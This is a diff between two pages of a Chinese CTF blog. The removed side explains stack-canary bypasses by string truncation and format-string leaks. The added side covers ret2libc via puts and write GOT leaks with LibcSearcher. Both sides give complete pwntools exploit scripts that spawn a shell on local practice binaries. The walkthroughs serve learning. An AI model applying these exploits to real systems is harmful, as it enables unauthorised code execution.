@@ -19,24 +19,22 @@
   <meta name="author" content="清风">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Canary 的绕过方法 一、字符串截断获取canary 原理：  Canary设计其低字节为\x00，本意是阻止被read、write等函数直接将Canary读出来。通过栈溢出将低位的\x00覆写，就可以读出Canary的值。  二话不说，上题   基础检查发现canary 丢入ida中   发现在循环printf,并且存在字符串漏洞（这个稍后再谈） 同时有getshell函数   可以直接拿s">
+    <meta name="description" content="原理：在程序运行中，当函数运行过一次之后，会将函数的地址存在got表中，我们可以利用输出函数对函数地址进行泄露 puts64位*题目*   基础检查，只有NX保护 丢入ida   第二个read 明显存在栈溢出 寻找system   发现找不到system 和binsh 也没有flag的字符，初步认为要泄露libc 接下来开始payload的构造 注意64位要用寄存器来传参 用ROR-gadge">
 <meta property="og:type" content="article">
-<meta property="og:title" content="canary的绕过方法">
-<meta property="og:url" content="http://example.com/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:title" content="关于ret2libc的泄露">
+<meta property="og:url" content="http://example.com/2024/10/01/libc%E6%B3%84%E9%9C%B2/index.html">
 <meta property="og:site_name" content="清风不识字">
-<meta property="og:description" content="Canary 的绕过方法 一、字符串截断获取canary 原理：  Canary设计其低字节为\x00，本意是阻止被read、write等函数直接将Canary读出来。通过栈溢出将低位的\x00覆写，就可以读出Canary的值。  二话不说，上题   基础检查发现canary 丢入ida中   发现在循环printf,并且存在字符串漏洞（这个稍后再谈） 同时有getshell函数   可以直接拿s">
+<meta property="og:description" content="原理：在程序运行中，当函数运行过一次之后，会将函数的地址存在got表中，我们可以利用输出函数对函数地址进行泄露 puts64位*题目*   基础检查，只有NX保护 丢入ida   第二个read 明显存在栈溢出 寻找system   发现找不到system 和binsh 也没有flag的字符，初步认为要泄露libc 接下来开始payload的构造 注意64位要用寄存器来传参 用ROR-gadge">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/source/_posts/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/120.jpg">
-<meta property="article:published_time" content="2024-09-30T08:35:20.000Z">
-<meta property="article:modified_time" content="2024-10-01T10:11:19.365Z">
+<meta property="article:published_time" content="2024-10-01T10:20:38.000Z">
+<meta property="article:modified_time" content="2024-10-01T10:53:22.855Z">
 <meta property="article:author" content="清风">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/source/_posts/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/120.jpg">
   
   
   
-  <title>canary的绕过方法 - 清风不识字</title>
+  <title>关于ret2libc的泄露 - 清风不识字</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="canary的绕过方法"></span>
+            <span id="subtitle" data-typed-text="关于ret2libc的泄露"></span>
           
         </div>
 
@@ -214,8 +212,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-09-30 16:35" pubdate>
-          2024年9月30日 下午
+        <time datetime="2024-10-01 18:20" pubdate>
+          2024年10月1日 晚上
         </time>
       </span>
     
@@ -226,7 +224,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          770 字
+          900 字
         
       </span>
     
@@ -237,7 +235,7 @@
         
         
         
-          7 分钟
+          8 分钟
         
       </span>
     
@@ -274,116 +272,109 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">canary的绕过方法</h1>
+            <h1 id="seo-header">关于ret2libc的泄露</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="Canary-的绕过方法"><a href="#Canary-的绕过方法" class="headerlink" title="Canary 的绕过方法"></a>Canary 的绕过方法</h1><p> <strong>一、字符串截断获取canary</strong></p>
-<p><strong>原理：</strong></p>
-<ul>
-<li>Canary设计其低字节为<code>\x00</code>，本意是阻止被read、write等函数直接将Canary读出来。<strong>通过栈溢出将低位的<code>\x00</code>覆写，就可以读出Canary的值。</strong></li>
-</ul>
-<p>二话不说，上题</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/1.png" srcset="/img/loading.gif" lazyload class="">
+                <p> <strong>原理：在程序运行中，当函数运行过一次之后，会将函数的地址存在got表中，我们可以利用输出函数对函数地址进行泄露</strong></p>
+<h6 id="puts64位"><a href="#puts64位" class="headerlink" title="puts64位"></a><strong>puts64位</strong></h6><p><em><strong>*<a target="_blank" rel="noopener" href="https://download.csdn.net/download/zhuo1358/89068003">题目</a>*</strong></em></p>
 
-<p>基础检查发现canary</p>
-<p>丢入ida中</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/2.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>发现在循环printf,并且存在字符串漏洞（这个稍后再谈）</p>
-<p>同时有getshell函数</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/3.png" srcset="/img/loading.gif" lazyload class="">
+<p>基础检查，只有NX保护</p>
+<p>丢入ida</p>
 
-<p>可以直接拿shell</p>
-<p>接下来就是找canary到栈顶的偏移</p>
-<p>有两种方法，这里先介绍第一种</p>
-<p>看汇编语言</p>
-<p>跟进这段函数的汇编</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/4.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>发现 多了一段异或比较 </p>
-<p>可以判断canary在var_c里，</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/5.png" srcset="/img/loading.gif" lazyload class="">
+<p>第二个read 明显存在栈溢出</p>
+<p>寻找system</p>
 
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/16.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>所以buf 到canary的偏移为0x70-0xc</p>
-<p>payload1的构造为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span>-<span class="hljs-number">0xc</span>)<br></code></pre></td></tr></table></figure>
+<p>发现找不到system 和binsh</p>
+<p>也没有flag的字符，初步认为要泄露libc</p>
+<p>接下来开始payload的构造</p>
+<p>注意64位要用寄存器来传参</p>
+<p>用ROR-gadget寻找合适的寄存器</p>
 
-<p><strong>#注意 必须用sendline 发送 用\n来覆盖’\x00’</strong></p>
-<p>发送之后接受字符</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">canary=u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span><br><span class="hljs-comment">#这里之所以要-0xa 是要去掉\n</span><br></code></pre></td></tr></table></figure>
 
-<p>最后构造payload2</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x70</span>-<span class="hljs-number">0xc</span>)+p32(canary)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+p32(getshell)<br></code></pre></td></tr></table></figure>
+<p>泄露出read的真实地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x400823</span>)+p64(read_got)+p64(puts_plt)+p64(main)<br></code></pre></td></tr></table></figure>
 
-<p>最终exp为</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;1122&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./1122&#x27;</span>)<br><br>get_shell = ELF(<span class="hljs-string">&quot;./1122&quot;</span>).sym[<span class="hljs-string">&quot;getshell&quot;</span>]<br><br>io.recvuntil(<span class="hljs-string">&quot;Hello Hacker!\n&quot;</span>)<br><br><span class="hljs-comment"># leak Canary</span><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">100</span><br>io.sendline(payload)<br><br>io.recvuntil(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">100</span>)<br>Canary = u32(io.recv(<span class="hljs-number">4</span>))-<span class="hljs-number">0xa</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br><br><span class="hljs-comment"># Bypass Canary</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">100</span>+p32(Canary)+<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">12</span>+p32(get_shell)<br>io.send(payload)<br><br>io.recv()<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+<p> 下面是接收数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-comment">#read=u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><br><span class="hljs-comment">#主要使用第一个，第二个有数据干扰</span><br><br><span class="hljs-comment">#第一个的原理是我们的地址都是&#x27;\x7f&#x27;开头的，使用只有遇到&#x27;\x7f&#x27;才会开始接收</span><br></code></pre></td></tr></table></figure>
 
-<p>最后强调一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.binary = <span class="hljs-string">&#x27;1122&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p>这两行必须要有一个，否则无法运行</p>
-<p>最后运行得到shell</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/6.png" srcset="/img/loading.gif" lazyload class="">![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑**二、字符串漏洞泄露canary**
 
-<p>原理</p>
-<ul>
-<li>格式化字符串漏洞可以打印出栈中的内容，因此利用此漏洞可以打印出canary的值，从而进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%A0%88%E6%BA%A2%E5%87%BA&spm=1001.2101.3001.7020">栈溢出</a></li>
-</ul>
-<p>还是上面那道题</p>
-<p>这次来介绍一下另一种寻找偏移的办法</p>
-<p>用gdb 调试</p>
-<p>先用gdb在printf处下断点</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/7.png" srcset="/img/loading.gif" lazyload class="">
+<p>接下俩找libc版本又两种方法</p>
+<p>一个是去下面网站寻找</p>
+<p><a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=read:a50">LibcSearcher</a></p>
 
-<p>找到第一个printf下的栈帧0xffffcf98</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/8.png" srcset="/img/loading.gif" lazyload class="">
 
-<p>从ida上知道程序主要在vuln 函数里面</p>
-<p>用gdb 运行文件并在函数下断点运行</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/9.png" srcset="/img/loading.gif" lazyload class="">
-
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/10.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>发现有一段异或比较，可以判断canary 的值就在eax里面</p>
-<p>不断步入到0x8049256</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/11.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>记住eax的值</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/12.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>发现canary存在地址0xc中</p>
-<p>可以计算偏移</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/13.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>继续点n</p>
-<p>到read 函数运行（这一步很重要,否则偏移不准确）</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/14.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>再次查看栈帧计算此时canary 到esp的偏移量</p>
-<img src="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/15.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>因为程序是32位</p>
-<p>4个字节一组就是31组</p>
-<p>所以canary的偏移为31</p>
-<p>这部分可参考</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/233515.html">https://www.freebuf.com/articles/system/233515.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/glhdbk/article/details/100595050">https://blog.csdn.net/glhdbk/article/details/100595050</a></p>
-<p>则payload1可构造</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">payload_1 = <span class="hljs-string">b&#x27;%x-&#x27;</span> * ( <span class="hljs-number">6</span> + <span class="hljs-number">25</span>)<br>conn.send(payload_1)<br>recvbytes = conn.recv()<br><br><span class="hljs-comment"># 获取canary</span><br>canary = <span class="hljs-built_in">int</span>(recvbytes.split(<span class="hljs-string">b&#x27;-&#x27;</span>)[-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure>
-
-<p>泄露出canary的值</p>
-<p>最后进行再一次栈溢出</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload_2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x70</span> - <span class="hljs-number">0xc</span>) + p32(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+ p32(getshell)<br></code></pre></td></tr></table></figure>
-
-<p>最终exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><br>conn = process(<span class="hljs-string">&#x27;./1122&#x27;</span>)<br><br>getshell = <span class="hljs-number">0x080491b6</span><br>conn.recvuntil(<span class="hljs-string">&#x27;Hello Hacker!\n&#x27;</span>)<br><br><span class="hljs-comment"># 第一次溢出</span><br>payload_1 = <span class="hljs-string">b&#x27;%x-&#x27;</span> * ( <span class="hljs-number">6</span> + <span class="hljs-number">25</span>)<br>conn.send(payload_1)<br>recvbytes = conn.recv()<br><br><span class="hljs-comment"># 获取canary</span><br>canary = <span class="hljs-built_in">int</span>(recvbytes.split(<span class="hljs-string">b&#x27;-&#x27;</span>)[-<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Canary: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&#x27;</span>)<br><span class="hljs-comment"># 第二次溢出</span><br>payload_2 = <span class="hljs-string">b&#x27;a&#x27;</span> * (<span class="hljs-number">0x70</span> - <span class="hljs-number">0xc</span>) + p32(canary) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc</span>+ p32(getshell)<br>conn.send(payload_2)<br>conn.recv()<br>conn.interactive()<br></code></pre></td></tr></table></figure>
+<p>另一种方法是安装LibcSearcher的库</p>
+<p>下面是安装教程</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/neuisf/article/details/103829683">LibcSearcher安装</a></p>
+<p>我使用的是第二种方法</p>
+<p>泄露出地址之后开始寻找版本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#LibcSearcher的使用示例</span><br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br></code></pre></td></tr></table></figure>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" srcset="/img/loading.gif" lazyload alt="点击并拖拽以移动"></p>
 
+
+<p>选择正确的版本</p>
+<p>最后再进行一次溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x40057e</span>)+p64(<span class="hljs-number">0x400823</span>)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="hljs-number">0xdeadbeef</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这里还要注意栈对齐，要用寄存器多绕一步来维持栈平衡</p>
+
+
+<p>最后运行</p>
+g)![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)编辑最终exp
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>io=process(<span class="hljs-string">&#x27;./libc&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./libc&#x27;</span>)<br>read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>main=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>io.recvuntil(<span class="hljs-string">&quot;Hacker,What&#x27;s your name?&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x400823</span>)+p64(read_got)+p64(puts_plt)+p64(main)<br>io.recvuntil(<span class="hljs-string">&quot;then let&#x27;s begin!\n&quot;</span>)<br>io.sendline(payload)<br>read=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;the read really address\n&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(read))<br>libc=LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,read)<br>libc_base=read-libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br>system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>io.send(<span class="hljs-string">&#x27;2&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">120</span>+p64(<span class="hljs-number">0x40057e</span>)+p64(<span class="hljs-number">0x400823</span>)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="hljs-number">0xdeadbeef</span>)<br>io.recvuntil(<span class="hljs-string">&quot;then let&#x27;s begin!\n&quot;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>这里提醒一下读者，一定要注意数据的接收顺序来编写recvuntil，笔者在这里卡了好久</p>
+<h6 id="write-32位）"><a href="#write-32位）" class="headerlink" title="write(32位）"></a><strong>write(32位）</strong></h6><p><strong>基础检查</strong></p>
+<p><em><strong>*<a target="_blank" rel="noopener" href="https://download.csdn.net/download/zhuo1358/89059082">题目</a>*</strong></em></p>
+
+
+<p>基础检查，保护基本没开</p>
+<p>丢入ida</p>
+
+
+
+
+<p>很简单 read 函数存在明显的栈溢出</p>
+
+
+<p>同样还是找不到system 也没有flag等字符</p>
+<p>初步认为是libc 泄露</p>
+<p>那么可以运用write函数来泄露got表</p>
+<p>在ida中找到返回函数</p>
+
+
+<p>使用payload1的构造为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload =<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(write)+p32(<span class="hljs-number">0x80483f4</span>)+p32(<span class="hljs-number">1</span>)+p32(read)+p32(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure>
+
+<p>这里要注意write函数要传入三个参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t write(<span class="hljs-built_in">int</span> fd,const void*buf,size_t count);<br>参数说明：<br>  fd:是文件描述符（write所对应的是写，即就是<span class="hljs-number">1</span>）<br>  buf:通常是一个字符串，需要写入的字符串<br>  count：是每次写入的字节数<br></code></pre></td></tr></table></figure>
+
+
+
+<p>地址泄露后开始找libc</p>
+<p>这次我选择用第一种方法</p>
+
+
+<p>找到对应地址</p>
+<p>开始找算偏移和构造system和binsh 的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">base=read_got-<span class="hljs-number">0x10a840</span><br>system=base+<span class="hljs-number">0x04c880</span><br>binsh=base+<span class="hljs-number">0x1b5fc8</span><br></code></pre></td></tr></table></figure>
+
+<p>最后再进行一次 栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br></code></pre></td></tr></table></figure>
+
+<p>运行exp</p>
+ 
+
+<p>最终exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh=process(<span class="hljs-string">&#x27;./123&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./123&#x27;</span>)<br>read=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload =<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(write)+p32(<span class="hljs-number">0x80483f4</span>)+p32(<span class="hljs-number">1</span>)+p32(read)+p32(<span class="hljs-number">4</span>)<br>sh.send(payload)<br>read_got=u32(sh.recv())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;the read of address :&quot;</span>,<span class="hljs-built_in">hex</span>(read_got))<br><br>base=read_got-<span class="hljs-number">0x10a840</span><br>system=base+<span class="hljs-number">0x04c880</span><br>binsh=base+<span class="hljs-number">0x1b5fc8</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">140</span>+p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>sh.send(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
                 
               </div>
             
@@ -428,8 +419,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>canary的绕过方法</div>
-      <div>http://example.com/2024/09/30/canary的绕过方法/</div>
+      <div>关于ret2libc的泄露</div>
+      <div>http://example.com/2024/10/01/libc泄露/</div>
     </div>
     <div class="license-meta">
       
@@ -441,7 +432,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年9月30日</div>
+          <div>2024年10月1日</div>
         </div>
       
       
@@ -473,15 +464,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/01/libc%E6%B3%84%E9%9C%B2/" title="关于ret2libc的泄露">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">关于ret2libc的泄露</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2024/09/30/canary%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" title="canary的绕过方法">
+                        <span class="hidden-mobile">canary的绕过方法</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
